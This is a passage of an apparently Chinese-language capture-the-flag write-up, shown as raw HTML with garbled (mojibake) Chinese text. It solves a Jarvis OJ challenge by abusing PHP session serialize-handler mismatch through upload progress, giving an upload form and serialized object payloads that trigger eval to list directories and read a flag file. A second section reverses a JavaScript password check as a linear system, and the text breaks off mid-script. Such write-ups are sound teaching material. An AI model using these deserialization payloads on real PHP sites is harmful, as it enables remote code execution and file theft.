class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:6:&quot;spoock&quot;</span><br></pre></td></tr></table></figure><ul><li>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</span><br></pre></td></tr></table></figure><ul><li>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</li></ul><p><strong>å½¢æˆåŸç†æ˜¯åœ¨ç”¨session.serialize_handler &#x3D; php_serializeå­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ | , å†ç”¨session.serialize_handler &#x3D; phpæ ¼å¼å–å‡º$_SESSIONçš„å€¼æ—¶ â€œ|â€ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦</strong></p><p>å°† payload å†™å…¥ session ï¼Œphp æœ‰ä¸ªä¸Šä¼ æ–‡ä»¶çš„ä¼šå°†æ–‡ä»¶åå†™å…¥ session çš„æŠ€å·§ï¼Œæ»¡è¶³ä»¥ä¸‹ 2 ä¸ªæ¡ä»¶å°±ä¼šå†™å…¥åˆ° session ä¸­</p><ol><li><code>session.upload_progress.enabled = On</code></li><li>ä¸Šä¼ ä¸€ä¸ªå­—æ®µçš„å±æ€§åå’Œ <code>session.upload_progress.name</code> çš„å€¼ç›¸ï¼Œè¿™é‡Œæ ¹æ® phpinfo ä¿¡æ¯çœ‹å¾—å‡ºï¼Œå€¼ä¸º <code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼Œ å³<br><code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></li></ol><p>å†™ä¸ªé¡µé¢æ¥æ‰“ï¼Œé€šè¿‡è¿™ä¸ªç½‘é¡µå»æŠ“åŒ…æ”¹åŒ…è¾¾åˆ°ç›®çš„</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>â€œPHP_SESSION_UPLOAD_PROGRESSâ€ çš„ valueä¸èƒ½ä¸ºç©º</p></blockquote><p>æœ¬åœ°ç”Ÿæˆ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span> = <span class="string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;&#125;</span><br><span class="line">å½“ç„¶è¿™ä¸ªæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬è¦ç¨å¾®æ”¹ä¸€ä¸‹ï¼Œ<span class="string">&quot;è¦è½¬ä¹‰ï¼Œå‰é¢åŠ ä¸ª|</span></span><br><span class="line"><span class="string">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:24:\&quot;var_dump(scandir(&#x27;./&#x27;));\&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">çœ‹æ ¹ç›®å½• payload</span><br><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure><p>phpinfo é¡µé¢ä¸­å¯ä»¥çœ‹åˆ° session çš„å­˜æ”¾ä½ç½®ï¼Œæœ‰ä¸ª<code>/opt/lampp/</code>ä¼°è®¡æ˜¯è£…çš„çš„ xampp è¿™ä¸ªé›†æˆçš„ç¯å¢ƒï¼Œè€Œè¿™ä¸ªé›†æˆç¯å¢ƒçš„ web é¡µé¢æ”¾åœ¨ <code>htdocs</code> ç›®å½•ä¸‹çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:38:\&quot;var_dump(scandir(&#x27;/opt/lampp/&#x27;));\&quot;;&#125;</span><br><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:40:\&quot;var_dump(scandir(&#x27;/opt/lampp/htdocs/&#x27;));\&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‹¿åˆ° flag çš„ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:89:\&quot;var_dump(file_get_contents(&#x27;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#x27;));\&quot;;&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><p>æœ‰ä¸€ä¸ªcheckåŠŸèƒ½ï¼Œè¾“å…¥é”™è¯¯çš„å¯†ç ä¼šæç¤ºâ€œWrong Password!!â€ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œæœ‰ä¸ªapp.jsã€‚å°†è¯¥jsæ–‡ä»¶æ ¼å¼åŒ–ååœ¨é‡Œé¢æŸ¥æ‰¾å­—ç¬¦ä¸²â€œWrong Password!!â€ï¼Œ</p><p>æ ¼å¼åŒ– js ç½‘ç«™ï¼š(<a href="https://tool.oschina.net/codeformat/js/">https://tool.oschina.net/codeformat/js/</a>)</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">post</span>(<span class="string">&quot;checkpass.json&quot;</span>, t,</span><br><span class="line">       <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">           self.<span class="title function_">checkpass</span>(e) ? self.<span class="title function_">setState</span>(&#123;</span><br><span class="line">               <span class="attr">errmsg</span>: <span class="string">&quot;Success!!&quot;</span>,</span><br><span class="line">               <span class="attr">errcolor</span>: b.<span class="property">green400</span></span><br><span class="line">           &#125;) : (self.<span class="title function_">setState</span>(&#123;</span><br><span class="line">               <span class="attr">errmsg</span>: <span class="string">&quot;Wrong Password!!&quot;</span>,</span><br><span class="line">               <span class="attr">errcolor</span>: b.<span class="property">red400</span></span><br><span class="line">           &#125;), <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">               self.<span class="title function_">setState</span>(&#123;</span><br><span class="line">                   <span class="attr">errmsg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">               &#125;)</span><br><span class="line">                   &#125;,</span><br><span class="line">           <span class="number">3e3</span>))</span><br><span class="line">       &#125;)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>checkpass(e)</code>å‡½æ•°ï¼Œå®šä½åˆ°è¯¥å‡½æ•°å¤„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.<span class="property">checkpass</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> e;</span><br><span class="line">                <span class="keyword">return</span> (e = r).<span class="property">__checkpass__REACT_HOT_LOADER__</span>.<span class="title function_">apply</span>(e, <span class="variable language_">arguments</span>)</span><br><span class="line">            &#125;,</span><br></pre></td></tr></table></figure><p>å®šä½åˆ° <code>checkpassREACTHOTLOADER</code> å¤„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">25</span> !== e.<span class="property">length</span>)</span><br><span class="line">                    <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> t = [], n = <span class="number">0</span>; n &lt; <span class="number">25</span>; n++)</span><br><span class="line">                    t.<span class="title function_">push</span>(e.<span class="title function_">charCodeAt</span>(n));</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>], o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]], n = <span class="number">0</span>; n &lt; <span class="number">25</span>; n++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, a = <span class="number">0</span>; a &lt; <span class="number">25</span>; a++)</span><br><span class="line">                        i += t[a] * o[n][a];</span><br><span class="line">                    <span class="keyword">if</span> (i !== r[n])</span><br><span class="line">                        <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸€ä¸ªçº¿æ€§æ–¹ç¨‹ç»„</p><p>è„šæœ¬</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.<span class="property">linalg</span> <span class="keyword">import</span> solve</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">r = np.<span class="title function_">array</span>([<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>])</span><br><span class="line">o = np.<span class="title function_">array</span>([[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span 